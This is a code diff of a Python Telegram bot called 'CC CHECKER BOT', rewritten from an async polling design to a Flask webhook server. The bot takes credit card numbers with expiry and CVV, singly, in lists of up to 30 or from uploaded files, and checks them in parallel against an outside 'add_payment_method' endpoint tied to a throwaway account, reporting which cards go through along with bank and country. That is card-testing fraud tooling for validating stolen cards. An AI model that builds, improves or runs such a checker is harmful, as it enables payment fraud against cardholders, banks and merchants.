@@ -1,46 +1,26 @@
 import os
 import re
-import asyncio
-import aiohttp
+import json
 import tempfile
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
-from telegram.constants import ParseMode
+import threading
+import concurrent.futures
+from flask import Flask, request, jsonify
+import requests
 import logging
 
-# Enable logging
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
+# Set up logging
+logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# API endpoint
+# Telegram Bot Token - set this in Render environment variables
+TELEGRAM_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
 API_URL = "https://andul-1.onrender.com/add_payment_method/sogaged371@hudisk.com/sogaged371@/"
 
-# Conversation states
-WAITING_FOR_CARDS = 1
-WAITING_FOR_FILE = 2
+# Create Flask app
+app = Flask(__name__)
 
-# Global session
-session = None
-# Semaphore for limiting concurrent requests
-semaphore = asyncio.Semaphore(10)  # 10 concurrent requests
-
-async def init_session():
-    """Initialize aiohttp session"""
-    global session
-    if not session:
-        timeout = aiohttp.ClientTimeout(total=30)
-        connector = aiohttp.TCPConnector(limit=0)  # No limit
-        session = aiohttp.ClientSession(timeout=timeout, connector=connector)
-
-async def close_session():
-    """Close the session"""
-    global session
-    if session:
-        await session.close()
-        session = None
+# Thread pool for parallel processing
+executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
 
 def validate_card(card_input):
     """Validate and format card details"""
@@ -85,8 +65,8 @@ def validate_card(card_input):
         logger.error(f"Validation error: {e}")
         return None, "❌ Validation error"
 
-async def check_card_parallel(card_input):
-    """Check single card - optimized for parallel processing"""
+def check_card(card_input):
+    """Check single card"""
     # Validate card first
     formatted_card, error = validate_card(card_input)
     if error:
@@ -96,24 +76,20 @@ async def check_card_parallel(card_input):
     url_encoded = formatted_card.replace('|', '%7C')
     full_url = f"{API_URL}{url_encoded}"
     
-    # Use semaphore to limit concurrent requests
-    async with semaphore:
-        try:
-            await init_session()
-            async with session.get(full_url, timeout=25) as response:
-                response_text = await response.text()
-                
-                if response.status == 200:
-                    result = parse_response(formatted_card, response_text)
-                    return card_input, result
-                else:
-                    return card_input, f"❌ API Error: Status {response.status}"
-                    
-        except asyncio.TimeoutError:
-            return card_input, "❌ Request timeout"
-        except Exception as e:
-            logger.error(f"Request error: {e}")
-            return card_input, "❌ Connection error"
+    try:
+        response = requests.get(full_url, timeout=20)
+        
+        if response.status_code == 200:
+            result = parse_response(formatted_card, response.text)
+            return card_input, result
+        else:
+            return card_input, f"❌ API Error: Status {response.status_code}"
+            
+    except requests.exceptions.Timeout:
+        return card_input, "❌ Request timeout"
+    except Exception as e:
+        logger.error(f"Request error: {e}")
+        return card_input, "❌ Connection error"
 
 def parse_response(card_info, response_text):
     """Parse API response and format output"""
@@ -196,9 +172,41 @@ def parse_response(card_info, response_text):
 - BANK : ERROR
 - COUNTRY : ERROR"""
 
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /start command"""
-    welcome_text = """💳 *CC CHECKER BOT*
+def send_telegram_message(chat_id, text, parse_mode=None):
+    """Send message to Telegram"""
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    payload = {
+        'chat_id': chat_id,
+        'text': text,
+        'parse_mode': parse_mode
+    }
+    try:
+        response = requests.post(url, json=payload, timeout=10)
+        return response.json()
+    except Exception as e:
+        logger.error(f"Failed to send message: {e}")
+        return None
+
+def send_telegram_action(chat_id, action="typing"):
+    """Send typing action"""
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendChatAction"
+    payload = {
+        'chat_id': chat_id,
+        'action': action
+    }
+    try:
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass
+
+def process_command(update):
+    """Process Telegram command"""
+    chat_id = update['message']['chat']['id']
+    text = update['message'].get('text', '').strip()
+    
+    # Handle /start command
+    if text == '/start':
+        welcome_text = """💳 *CC CHECKER BOT*
 
 *Commands:*
 /chk - Check single card
@@ -208,171 +216,12 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 *Format:* CARD|MM|YY|CVV
 *Example:* 5220940191435288|06|27|404"""
-    
-    await update.message.reply_text(welcome_text, parse_mode=ParseMode.MARKDOWN)
-
-async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /chk command"""
-    if not context.args:
-        await update.message.reply_text(
-            "❌ Usage: /chk CARD|MM|YYYY|CVV\n\nExample: /chk 5220940191435288|06|2027|404",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    card_input = ' '.join(context.args)
-    message = await update.message.reply_text("🔍 Checking card...", parse_mode=ParseMode.MARKDOWN)
-    
-    _, result = await check_card_parallel(card_input)
-    await message.edit_text(result)
-
-async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /mass command"""
-    await update.message.reply_text(
-        "⚡ *ULTRA-FAST MASS CHECK*\n\nSend up to 30 cards (one per line):\n\n4232231106894283|06|26|241\n4116670005727071|02|26|426\n5303471055207621|01|27|456\n\nType /cancel to stop.",
-        parse_mode=ParseMode.MARKDOWN
-    )
-    
-    return WAITING_FOR_CARDS
-
-async def file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /file command"""
-    await update.message.reply_text(
-        "📁 *FILE UPLOAD*\n\nSend a .txt file containing cards (one per line).\nMax 30 cards.\n\nType /cancel to stop.",
-        parse_mode=ParseMode.MARKDOWN
-    )
-    
-    return WAITING_FOR_FILE
-
-async def receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Receive and process cards for mass check"""
-    user_input = update.message.text.strip()
-    
-    if user_input.lower() == '/cancel':
-        await update.message.reply_text("❌ Mass check cancelled.")
-        return ConversationHandler.END
-    
-    # Split by lines
-    lines = user_input.split('\n')
-    cards = [line.strip() for line in lines if line.strip()]
-    
-    if not cards:
-        await update.message.reply_text("❌ No cards found.")
-        return WAITING_FOR_CARDS
-    
-    await process_cards_fast(update, cards, "Mass Check")
-    return ConversationHandler.END
-
-async def receive_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Receive and process file upload"""
-    if not update.message.document:
-        await update.message.reply_text("❌ Please send a .txt file.")
-        return WAITING_FOR_FILE
-    
-    document = update.message.document
-    
-    # Check if it's a text file
-    if not document.file_name.lower().endswith('.txt'):
-        await update.message.reply_text("❌ Please send a .txt file.")
-        return WAITING_FOR_FILE
-    
-    try:
-        # Download the file
-        temp_file = tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False)
-        file_path = temp_file.name
         
-        file = await document.get_file()
-        await file.download_to_drive(file_path)
-        
-        # Read the file
-        with open(file_path, 'r') as f:
-            content = f.read()
-        
-        # Parse cards
-        lines = content.split('\n')
-        cards = [line.strip() for line in lines if line.strip()]
-        
-        # Remove temp file
-        os.unlink(file_path)
-        
-        if not cards:
-            await update.message.reply_text("❌ No valid cards found in file.")
-            return ConversationHandler.END
-        
-        await process_cards_fast(update, cards, "File Upload")
-        
-    except Exception as e:
-        logger.error(f"File processing error: {e}")
-        await update.message.reply_text(f"❌ Error processing file: {str(e)[:100]}")
+        send_telegram_message(chat_id, welcome_text, "Markdown")
     
-    return ConversationHandler.END
-
-async def process_cards_fast(update, cards, source_name):
-    """Process cards in parallel - FAST"""
-    # Limit to 30 cards
-    if len(cards) > 30:
-        await update.message.reply_text(f"⚠️ Limiting to first 30 cards (you sent {len(cards)})")
-        cards = cards[:30]
-    
-    if not cards:
-        await update.message.reply_text("❌ No valid cards found.")
-        return
-    
-    total_cards = len(cards)
-    
-    # Send initial status
-    status_msg = await update.message.reply_text(
-        f"⚡ *{source_name}*\nProcessing {total_cards} cards in parallel...\n⏱️ Estimated: 1-2 minutes",
-        parse_mode=ParseMode.MARKDOWN
-    )
-    
-    # Create tasks for all cards
-    tasks = [check_card_parallel(card) for card in cards]
-    
-    # Gather results as they complete
-    results = []
-    for future in asyncio.as_completed(tasks):
-        original_card, result = await future
-        results.append((original_card, result))
-    
-    # Send results in batches
-    processed = 0
-    successful = 0
-    failed = 0
-    
-    batch_size = 5
-    for i in range(0, len(results), batch_size):
-        batch = results[i:i+batch_size]
-        
-        for j, (original_card, result) in enumerate(batch, start=i+1):
-            if result.startswith("- CARD :"):
-                await update.message.reply_text(f"Card {j}:\n{result}\n{'='*40}")
-                successful += 1
-            else:
-                await update.message.reply_text(f"❌ Card {j}: {result}")
-                failed += 1
-        
-        # Update status
-        current = min(i + batch_size, total_cards)
-        await status_msg.edit_text(
-            f"⚡ *{source_name}*\nProgress: {current}/{total_cards} cards",
-            parse_mode=ParseMode.MARKDOWN
-        )
-    
-    # Final summary
-    await status_msg.edit_text(
-        f"✅ *{source_name} COMPLETE!*\n✅ Successful: {successful}\n❌ Failed: {failed}\n📋 Total: {total_cards}",
-        parse_mode=ParseMode.MARKDOWN
-    )
-
-async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Cancel the conversation"""
-    await update.message.reply_text("❌ Operation cancelled.")
-    return ConversationHandler.END
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show detailed help"""
-    help_text = """📚 *CC CHECKER BOT HELP*
+    # Handle /help command
+    elif text == '/help':
+        help_text = """📚 *CC CHECKER BOT HELP*
 
 *Commands:*
 /start - Show commands
@@ -387,96 +236,114 @@ CARD_NUMBER|MM|YYYY|CVV
 *Examples:*/chk 5220940191435288|06|2027|404
 /mass
 4232231106894283|06|26|241
+        
+        send_telegram_message(chat_id, help_text, "Markdown")
+    
+    # Handle /chk command
+    elif text.startswith('/chk '):
+        card_input = text[5:].strip()
+        if not card_input:
+            send_telegram_message(chat_id, "❌ Usage: /chk CARD|MM|YYYY|CVV\n\nExample: /chk 5220940191435288|06|2027|404")
+            return
+        
+        send_telegram_action(chat_id, "typing")
+        _, result = check_card(card_input)
+        send_telegram_message(chat_id, result)
+    
+    # Handle /mass command start
+    elif text == '/mass':
+        mass_text = """⚡ *ULTRA-FAST MASS CHECK*
+
+Send up to 30 cards (one per line):
+4232231106894283|06|26|241
 4116670005727071|02|26|426
 
-"""
+Type /cancel to stop."""
+        
+        send_telegram_message(chat_id, mass_text, "Markdown")
     
-    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
-
-async def handle_direct_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle direct card messages"""
-    text = update.message.text.strip()
+    # Handle mass check input (multiple lines)
+    elif '|' in text and '\n' in text:
+        # This is a mass check with multiple cards
+        lines = text.split('\n')
+        cards = [line.strip() for line in lines if line.strip()]
+        
+        if len(cards) > 30:
+            send_telegram_message(chat_id, f"⚠️ Limiting to first 30 cards (you sent {len(cards)})")
+            cards = cards[:30]
+        
+        # Process in parallel using thread pool
+        send_telegram_action(chat_id, "typing")
+        send_telegram_message(chat_id, f"⚡ Processing {len(cards)} cards in parallel...\n⏱️ Estimated: 1-2 minutes")
+        
+        # Submit all tasks
+        futures = []
+        for card in cards:
+            future = executor.submit(check_card, card)
+            futures.append(future)
+        
+        # Collect results as they complete
+        completed = 0
+        for i, future in enumerate(concurrent.futures.as_completed(futures), 1):
+            card_input, result = future.result()
+            send_telegram_message(chat_id, f"Card {i}:\n{result}\n{'='*40}")
+            completed += 1
+        
+        send_telegram_message(chat_id, f"✅ Mass check complete!\nProcessed: {completed}/{len(cards)} cards")
     
-    # Check if it looks like a card
-    if '|' in text and text.count('|') == 3 and any(c.isdigit() for c in text):
-        message = await update.message.reply_text("🔍 Checking card...", parse_mode=ParseMode.MARKDOWN)
-        _, result = await check_card_parallel(text)
-        await message.edit_text(result)
+    # Handle single card input (without command)
+    elif '|' in text and text.count('|') == 3:
+        send_telegram_action(chat_id, "typing")
+        _, result = check_card(text)
+        send_telegram_message(chat_id, result)
+    
+    # Handle unknown command
+    elif text.startswith('/'):
+        send_telegram_message(chat_id, "❌ Unknown command. Use /start to see available commands.")
 
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle errors"""
-    logger.error(f"Error: {context.error}")
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    """Telegram webhook endpoint"""
     try:
-        await update.message.reply_text("❌ An error occurred")
-    except:
-        pass
+        update = request.json
+        
+        # Log the update
+        logger.info(f"Received update: {update}")
+        
+        # Process the update in a separate thread to avoid blocking
+        threading.Thread(target=process_command, args=(update,)).start()
+        
+        return jsonify({'status': 'ok'}), 200
+    except Exception as e:
+        logger.error(f"Webhook error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
-async def post_stop(application):
-    """Cleanup on stop"""
-    await close_session()
+@app.route('/setwebhook', methods=['GET'])
+def set_webhook():
+    """Set Telegram webhook"""
+    try:
+        webhook_url = f"{request.host_url}webhook"
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook"
+        payload = {'url': webhook_url}
+        response = requests.post(url, json=payload)
+        
+        if response.status_code == 200:
+            return f"✅ Webhook set to: {webhook_url}"
+        else:
+            return f"❌ Failed to set webhook: {response.text}"
+    except Exception as e:
+        return f"❌ Error: {e}"
 
-def main():
-    """Start the bot with webhook for Render"""
-    TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
-    PORT = int(os.getenv('PORT', 10000))
-    WEBHOOK_URL = os.getenv('WEBHOOK_URL', '')
-    
-    if not TOKEN:
-        print("❌ Error: TELEGRAM_BOT_TOKEN not set")
-        print("Set it with: export TELEGRAM_BOT_TOKEN='your_token_here'")
-        return
-    
-    print("🤖 Starting CC Checker Bot...")
-    
-    # Create application
-    application = Application.builder().token(TOKEN).post_stop(post_stop).build()
-    
-    # Create conversation handler for mass check
-    mass_conv_handler = ConversationHandler(
-        entry_points=[CommandHandler("mass", mass_command)],
-        states={
-            WAITING_FOR_CARDS: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_cards)
-            ]
-        },
-        fallbacks=[CommandHandler("cancel", cancel_command)]
-    )
-    
-    # Create conversation handler for file upload
-    file_conv_handler = ConversationHandler(
-        entry_points=[CommandHandler("file", file_command)],
-        states={
-            WAITING_FOR_FILE: [
-                MessageHandler(filters.Document.ALL & ~filters.COMMAND, receive_file)
-            ]
-        },
-        fallbacks=[CommandHandler("cancel", cancel_command)]
-    )
-    
-    # Add handlers
-    application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CommandHandler("chk", chk_command))
-    application.add_handler(mass_conv_handler)
-    application.add_handler(file_conv_handler)
-    
-    # Handle direct card messages
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_direct_card))
-    
-    # Error handler
-    application.add_error_handler(error_handler)
-    
-    print("✅ Bot is ready!")
-    print(f"📡 Port: {PORT}")
-    
-    # Run with polling (simpler for now)
-    print("🔄 Starting in polling mode...")
-    application.run_polling(drop_pending_updates=True)
+@app.route('/health', methods=['GET'])
+def health_check():
+    """Health check endpoint"""
+    return jsonify({'status': 'healthy'}), 200
+
+@app.route('/')
+def home():
+    """Home page"""
+    return "🤖 CC Checker Bot is running! Use /setwebhook to configure Telegram webhook."
 
 if __name__ == '__main__':
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\n🛑 Bot stopped")
-    except Exception as e:
-        print(f"❌ Fatal error: {e}")
+    port = int(os.getenv('PORT', 8080))
+    app.run(host='0.0.0.0', port=port, debug=False)
